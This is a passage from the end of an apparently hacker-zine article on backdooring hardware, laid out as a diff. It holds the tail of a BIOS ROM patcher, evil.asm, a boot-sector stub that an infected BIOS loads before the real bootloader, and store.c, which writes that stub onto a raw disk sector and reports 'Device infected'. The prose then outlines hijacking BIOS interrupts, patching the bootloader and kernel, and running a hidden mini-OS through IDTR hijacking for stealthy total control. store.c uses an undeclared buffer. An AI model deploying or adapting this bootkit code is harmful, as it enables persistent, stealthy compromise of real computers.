+  if ((tgt = search(buf, cnt)) == NULL)
+    {
+      fprintf(stderr, "could not find code to patch\n");
+      exit(1);
+    }
+  patch(tgt, cnt, sector);
+  for (i = 0; (ret = write(outfd, buf + i, cnt - i)) > 0; i += ret)
+    ;
+  if (ret == -1)
+    {
+      fprintf(stderr, "could not write patched ROM to disk\n");
+      exit(1);
+    }
+  close(devfd);
+  close(outfd);
+  free(buf);
+  return 0;
+}
+
+---
+
+
+--[ evil.asm
+
+;;; 
+;;; A sample code to be loaded by an infected BIOS instead of
+;;; the real bootloader. It basically moves himself so he can
+;;; load the real bootloader and jump on it. Replace the nops
+;;; if you want him to do something usefull.
+;;; 
+;;; usage is :
+;;;		no usage, this code must be loaded by store.c
+;;;
+;;; compile with : nasm -fbin evil.asm -o evil.bin
+;;; 
+	
+BITS	16			
+ORG	0			
+
+;; we need this label so we can check the code size
+entry:
+	
+	jmp	begin		; jump over data
+
+
+;; here comes data
+drive	db	0		; drive we're working on
+
+			
+begin:
+
+	mov	[drive], dl	; get the drive we're working on
+	
+	;; segments init
+	mov	ax, 0x07C0
+	mov	ds, ax
+	mov	es, ax
+
+	;; stack init
+	mov	ax, 0
+	mov	ss, ax
+	mov	ax, 0xffff
+	mov	sp, ax
+
+	;; move out of the zone so we can load the TRUE boot loader
+	mov	ax, 0x7c0
+	mov	ds, ax
+	mov	ax, 0x100
+	mov	es, ax
+	mov	si, 0
+	mov	di, 0
+	mov	cx, 0x200
+	cld
+	rep	movsb
+	
+	;; jump to our new location
+	jmp	0x100:next
+
+	
+next:				;; to jump to the new location
+	
+	;; load the true boot loader
+	mov	dl, [drive]
+	mov	ax, 0x07C0
+	mov	es, ax
+	mov	bx, 0
+	mov	ah, 2
+	mov	al, 1
+	mov	ch, 0
+	mov	cl, 1
+	mov	dh, 0
+	int	0x13
+
+	;; do your evil stuff there (ie : infect the boot loader)
+	nop
+	nop
+	nop	
+	
+	;; execute system
+	jmp 	07C0h:0
+
+	
+size    equ     $ - entry
+%if size+2 > 512
+	%error "code is too large for boot sector"
+%endif
+
+times   (512 - size - 2) db 0	; fill 512 bytes
+db      0x55, 0xAA		; boot signature
+
+---
+
+
+--[ store.c
+
+/*
+** code to be used to store a fake bootloader loaded by an infected BIOS
+**
+** usage is :
+**		store <device to store on> <sector number> <file to inject>
+**
+** compile with : gcc store.c -o store
+*/
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <fcntl.h>
+
+#define CODE_SIZE	512
+#define SECTOR_SIZE	512
+
+void	usage(char *cmd)
+{
+  fprintf(stderr, "usage is : %s <device> <sector> <code>", cmd);
+  exit(0);
+}
+
+
+int	main(int argc, char **argv)
+{
+  int	off;
+  int   i;
+  int   devfd;
+  int	codefd;
+  int   cnt; 
+  char  code[CODE_SIZE];
+  
+  if (argc != 4)
+    usage(argv[0]);
+  if ((devfd = open(argv[1], O_RDONLY)) == -1)
+    { 
+      fprintf(stderr, "error : could not open device\n");
+      exit(1);
+    } 
+  off = atoi(argv[2]);
+  if ((codefd = open(argv[3], O_RDONLY)) == -1)
+    { 
+      fprintf(stderr, "error : could not open code file\n");
+      exit(1);
+    } 
+  for (cnt = 0; cnt != CODE_SIZE; cnt += i)
+    if ((i = read(codefd, &(mbr[cnt]), CODE_SIZE - cnt)) <= 0) 
+      { 
+	fprintf(stderr, "error reading code\n");
+	exit(1);
+      }
+  lseek(devfd, (off - 1) * SECTOR_SIZE, SEEK_SET);
+  for (cnt = 0; cnt != CODE_SIZE; cnt += i)
+    if ((i = write(devfd, &(mbr[cnt]), CODE_SIZE - cnt)) <= 0) 
+      { 
+	fprintf(stderr, "error reading code\n");
+	exit(1);
+      }
+  close(devfd);
+  close(codefd);
+  printf("Device infected\n");
+  return 0;				   
+}
+
+---
+
+
+	Okay, now that we can load our code using the BIOS, time has come
+to consider what we can do in this position. As we are nearly the first one
+to have control over the system, we can do really interesting things.
+
+	First, we can hijack BIOS interruptions and make them jump to
+our code. This is interesting because instead of writing all the code in
+the BIOS, we can now hijack BIOS routines having as much space as we need
+and without having to do a lot of reverse engineering.
+
+	Next, we can easily patch the boot loader on-thy-fly as it is our
+own code which loads it. In fact, we don't even have to call the true
+boot loader if we don't want to, we can make a fake one that loads a nicely
+patched kernel based on the real one. Or you can make a fake boot loader
+(or even patch the real one on-the-fly) that loads the real kernel and
+patch it on the fly. The choice is up to you.
+
+        Finally, I would talk about one last thing that came on my mind.
+Combined with IDTR hijacking, patching the BIOS can assure us a complete
+control of the system. We can patch the BIOS so that it loads our own boot
+loader. This boot loader is a special one, in fact it loads a mini-OS of
+our own which sets an IDT. Then, as we hijacked the IDTR register (there
+are several ways to do it, the easiest being patching the target OS boot
+process in order to prevent him to erase our IDT), we can then load the
+true boot loader which will load the true kernel. At this time, our own os
+will hijack the entire system with its own IDT proxying any interrupt you
+want to, hijacking any event on the system. We even can use the system
+clock as a scheduler forthe two OS : the tick will be caught by our own 
+OS and depending the configuration (we can say for example 10% of the time 
+for our OS and 90% for the real OS), we can execute our code or give the 
+control to the real OS by jumping on its IDT.
+
+	 You can do lot of things simply by patching the BIOS, so I suggest
+you to implement your own ideas. Remember this is not so difficult,
+documentation about this subject already exists and we can really do lots
+of things. Just remember to use Bochs for tests before going in the wild,
+it certainly isn't fun when smoke comes out of one of the motherboard's
+chips...
+
+
+
+5.  Conclusion
+
+
+     So that's it, hardware can be backdoored quite easily. Of course,
+what I demonstrated here was just a fast overview. We can do LOTS of things
+with hardware, things that can assure us a total control of the computer
+we're on and remain stealth. There is a huge work to do in this area as
+more and more devices become CPU independent and implement many features
+that can be used to do funny things. Imagination (and portability, sic...)
+are the only limits.
+
+   For people very interested in having fun in the hardware world, I
+suggest to take a look at CPU microcode programming system
+(start with the AMD K8 reverse engineering, see [18]), network cards
+BIOSes and the PXE system.
+
+(And hardware hacking can be a fun start to learn to fuck the TCPA system).
+
+
+
+6.  References
+
+
+[1] : The Art of Assembly Programming - Randall Hyde
+(http://webster.cs.ucr.edu/AoA/index.html)
+
+[2] : Linux Device Drivers - Alessandro Rubini, Jonathan Corbet
+(http://www.xml.com/ldd/chapter/book/)
+
+[3] : OpenGL
+(http://www.opengl.org/)
+
+[4] : Neon Helium Productions (NeHe)
+(http://nehe.gamedev.net/)
+
+[5] : GPGPU
+(http://www.gpgpu.org)
+
+[6] : HLSL tutorial
+(http://msdn2.microsoft.com/en-us/library/bb173494.aspx)
+
+[7] : GLSL tutorial
+(http://nehe.gamedev.net/data/articles/article.asp?article=21)
+
+[8] : The NVIDIA Cg Toolkit
+(http://developer.nvidia.com/object/cg_toolkit.html)
+
+[9] : NVIDIA Cg tutorial
+(http://developer.nvidia.com/object/cg_tutorial_home.html)
+
+[10] : nVIDIA CUDA (Compute Unified Device Architecture)
+(http://developer.nvidia.com/object/cuda.html)
+
+[11] : Implementing and Detecting an ACPI BIOS RootKit - John Heasman
+(http://www.ngssoftware.com/jh_bhf2006.pdf)
+
+[12] : /dev/bios - Stefan Reinauer
+(http://www.openbios.info/development/devbios.html)
+
+[13] : OpenBIOS initiative
+(http://www.openbios.info/)
+
+[14] : Award BIOS reverse engineering guide - Pinczakko
+(http://www.geocities.com/mamanzip/Articles/Award_Bios_RE)
+
+[15] : Wim's BIOS
+(http://www.wimsbios.com/)
+
+[16] : Bochs IA-32 Emulator Project
+(http://bochs.sourceforge.net/)
+
+[17] : Bochs BIOS source code
+(http://bochs.sourceforge.net/cgi-bin/lxr/source/bios/rombios.c)
+
+[18] : Opteron Exposed: Reverse Engineering AMD K8 Microcode Updates
+(http://www.packetstormsecurity.nl/0407-exploits/OpteronMicrocode.txt)
+
+
+
+7.  Thanks
+
+     
+     Without these people, this file wouldn't be, so thanks to them :
+
+	* Auquen, for introducing me the idea of playing with hardware five
+	years ago
+
+	* Kad and Mayhem, for convincing me to write this article
+
+	* Sauron, for always motivating me (nothing sexual)
+
+	* Glenux, for pointing out CUDA
+
+	* All people present to scythale's aperos, for helping me to get
+	high in such ways I can come up with evil thinking (yeah, I was
+	drunk when I decided to backdoor my hardware)
+
+
+-- 
+scythale@gmail.com
